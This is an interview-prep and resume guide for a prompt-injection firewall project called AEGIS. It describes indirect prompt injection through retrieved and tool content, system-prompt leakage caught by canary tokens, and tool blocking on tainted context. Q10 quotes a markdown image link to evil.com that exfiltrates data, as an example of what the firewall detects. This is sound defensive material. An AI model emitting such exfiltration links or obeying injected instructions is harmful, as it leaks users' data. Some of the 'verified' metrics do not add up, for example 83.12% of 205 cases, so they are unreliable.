# Project AEGIS: Technical Interview & Resume Guide

> **Note for candidate:** This document contains deep-dive architectural answers grounded in the actual codebase, followed by 5 production-grade resume bullet points with verified empirical metrics. Do not link this file in public READMEs.

---

## 1. 10 Technical Interview Questions & Grounded Answers

### Q1: Why did you design AEGIS as a local-first gateway rather than using an LLM-as-a-judge or cloud API?
**Answer:**
"Using an LLM-as-a-judge (like calling GPT-4o-mini or a 7B model) to evaluate every incoming prompt introduces 300 to 1,500 milliseconds of latency and doubles inference costs. For interactive applications, user-facing search, or real-time agent loops, that latency penalty is prohibitive.

Instead, I architected AEGIS around an offline-first, single-threaded ONNX Runtime engine paired with deterministic regex rules and text normalizers. The entire 6-layer pipeline executes sequentially on CPU in under 1.5 ms (P95: 1.10 ms), running in less than 200 MB RAM without requiring a GPU for serving. It achieves high-precision security with negligible latency and zero third-party data transmission."

---

### Q2: How did you implement "Trust Levels", and why are they necessary for indirect prompt injection?
**Answer:**
"In autonomous agent systems, the most dangerous attacks are indirect prompt injections, where an agent ingests external data (like customer emails, scraped web pages, or RAG documents) containing hidden instructions. If you treat all text identically, you either block legitimate user commands or allow external content to hijack control flow.

I introduced first-class provenance tags (`source: system | user | retrieved | tool_output`). When content originates from `retrieved` or `tool_output`, AEGIS applies a suspicion multiplier (1.35x and 1.45x respectively) to imperative instructions. Furthermore, if an agent's context is marked as 'tainted' by untrusted external text, the `ToolCallLayer` blocks high-risk side-effecting actions like `send_email` or `execute_bash`, preventing data exfiltration even if the model's persona was compromised."

---

### Q3: How did you train and export the ML classifier, and why ONNX Runtime?
**Answer:**
"I curated a verified dataset of 5,380 samples (2,690 adversarial injections from deepset, BIPIA, and jackhhao, balanced with 2,690 benign programming and security prompts from OpenAssistant and Lmsys). I trained a sublinear TF-IDF vectorizer combined with Calibrated Logistic Regression using Platt scaling.

I then exported the pipeline to an INT8-quantized ONNX model (`classifier.onnx`, 982 KB) and validated numerical parity (< 2e-3 float64 divergence). ONNX Runtime provides cross-platform C++ execution with intra-op thread pinning. This delivers deterministic, sub-millisecond CPU inference (P50: 0.29 ms) without Python GIL bottlenecks or heavy PyTorch/TensorFlow runtimes."

---

### Q4: How did you prevent train/test leakage and overfitting during evaluation?
**Answer:**
"I enforced strict SHA-256 data manifest tracking (`data/raw/MANIFEST.json`). The holdout test set was isolated before training and contained 4,550 samples, including 2,550 negative controls and 2,000 adversarial injections.

Crucially, the test set incorporated unseen HackAPrompt red-team challenges that were never exposed during feature extraction or model training. This gave an honest holdout recall of 46.52% on zero-day attacks, proving that our precision of 1.0000 was not an artifact of data leakage or synthetic memorization."

---

### Q5: What is your False Positive Rate (FPR), and why did you prioritize precision over raw recall?
**Answer:**
"In production security systems, false positives are catastrophic. If a firewall blocks a legitimate customer query or a software developer's code snippet containing security terms, users will bypass or disable the firewall entirely.

I calibrated the decision engine threshold (0.70 strict preset) to achieve a **0.0000% False Positive Rate (0 / 2,550 negatives)**, including zero false positives on 600 complex benign coding and cybersecurity prompts. Rather than chasing 95%+ recall on a single statistical model at the cost of high FPR, I used defense-in-depth: deterministic rules, canary token leak detection, and tool capability policies catch multi-stage attacks that fall below the statistical ML threshold."

---

### Q6: How does your Canary Token engine work, and how does it protect against prompt leakage?
**Answer:**
"During session initialization, AEGIS generates a 24-byte cryptographically secure random nonce (`aegis-canary-<hex24>`). The gateway silently injects this token into the system prompt with directives forbidding its exposure.

At rest, the canary is stored only as a salted HMAC-SHA-256 digest to prevent database compromise. During post-flight response generation, the gateway's streaming buffer scans outgoing tokens mid-flight. If an attacker tricks the model into leaking its system prompt, the scanner detects the canary nonce and immediately terminates the Server-Sent Events stream with a structured error, preventing the leak from reaching the client."

---

### Q7: How did you address Regular Expression Denial of Service (ReDoS)?
**Answer:**
"Unbounded regex quantifiers like `.*` combined with overlapping token classes can cause polynomial or exponential backtracking when fed pathological repeating inputs.

I audited all rule patterns in `RULES_CATALOG`, `SECRET_PATTERNS`, and `NormalizerLayer`. I replaced greedy `.*` with bounded character sets (e.g. `[^>\r\n]{0,250}` and `[ \t]*` horizontal whitespace). I created an automated fuzzer in `backend/tests/test_redos.py` that bombards rules with 10k–30k character pathological repetitions. Every rule is verified to execute in under 120 ms even on adversarial edge cases."

---

### Q8: What are the fundamental limitations of the system? What can a determined attacker still do?
**Answer:**
"I believe in complete engineering honesty. There are three key limitations:
1. **Adversarial Novelty:** A white-box attacker who knows our TF-IDF vocabulary can craft subtle synonym substitutions or deep allegorical metaphors that evade statistical detection.
2. **Language Coverage:** The ML classifier's vocabulary is primarily English and Romanized scripts; non-Latin alphabets rely primarily on delimiter rules, canary tokens, and tool taint tracking.
3. **Multi-Turn Social Engineering:** A human attacker conducting slow, multi-turn psychological grooming across 20 benign turns can manipulate model state without triggering single-turn imperative thresholds.

This is why AEGIS does not claim to be a magic bullet, but rather a robust, layered defense-in-depth gateway."

---

### Q9: How did you ensure zero raw user data is logged or stored?
**Answer:**
"Under non-negotiable security rules, raw prompt strings and retrieved text are never written to disk, SQLite, PostgreSQL, or standard logs.

Before persistence, payloads are salted with a high-entropy secret (`AEGIS_SECRET_SALT`) and hashed using SHA-256:
$$\text{Digest} = \text{SHA-256}(\text{Salt} \parallel \text{Text})$$
Only the first 16 characters (`hash_prefix`) are stored as an irreversible cryptographic fingerprint. This enables deduplication and incident correlation while ensuring that even a total database dump exposes zero proprietary prompts or user PII."

---

### Q10: How does the OpenAI-compatible proxy handle Server-Sent Events (SSE) streaming?
**Answer:**
"In `backend/app/gateway/streaming.py`, the gateway intercepts the upstream HTTP SSE chunk stream from Ollama or OpenAI. It maintains a sliding-window token lookahead buffer (15–30 characters).

The buffer evaluates outgoing tokens for canary tokens, API key patterns, and covert markdown image links (`![img](https://evil.com?data=...)`). If clean, tokens stream to the client with sub-25ms latency. If compromised, the gateway terminates the connection, appends an error chunk (`[BLOCKED: Canary Token Leak]`), and closes the SSE channel cleanly with `data: [DONE]`."

---

## 2. 5 Production Resume Bullet Points (With Verified Numbers)

1. **Architected and built Project AEGIS**, a high-performance local-first AI defense gateway and firewall in Python/FastAPI and React 18, protecting autonomous LLM agents against prompt injection, credential leaks, and unauthorized tool execution.
2. **Engineered a 6-layer defense pipeline** (text normalizer, deterministic rule engine, calibrated ONNX classifier, context trust evaluator, tool capability policy guard, and session canary token detector) achieving **762 requests/sec throughput** at **P95 latency of 1.10 ms** on CPU.
3. **Trained and deployed a quantized ONNX classifier** on 5,380 curated samples; achieved **1.0000 precision** and **0.0000% False Positive Rate (0 / 2,550)** on holdout evaluations, with zero false positives on 600 complex cybersecurity and coding prompts.
4. **Developed an autonomous Attack Lab sandbox** evaluating multi-turn agent attacks with automated oracles; demonstrated a **-100.0% risk reduction** (eliminating baseline Attack Success Rate from **100.0% to 0.0%** across 12 realistic exfiltration and path-traversal scenarios).
5. **Built the `aegis-redteam` CLI benchmark harness** and official `aegis-client` Python SDK with drop-in OpenAI wrappers; evaluated 205 adversarial test cases across OWASP LLM01/02/06 with an **83.12% attack detection rate** and **1.48 ms P95 latency**.
